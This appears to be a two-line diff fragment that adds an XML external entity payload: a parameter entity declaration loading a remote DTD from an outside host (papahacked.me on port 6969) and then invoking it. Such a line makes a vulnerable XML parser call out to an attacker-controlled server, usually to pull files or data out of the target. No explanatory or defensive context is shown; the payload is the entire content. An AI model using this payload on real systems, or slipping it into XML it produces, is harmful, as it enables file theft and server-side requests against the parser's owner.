@@ -1,0 +1,2 @@
+<!ENTITY % rem3 SYSTEM "http://papahacked.me:6969/xxe/xxe_rem3">
+%rem3;
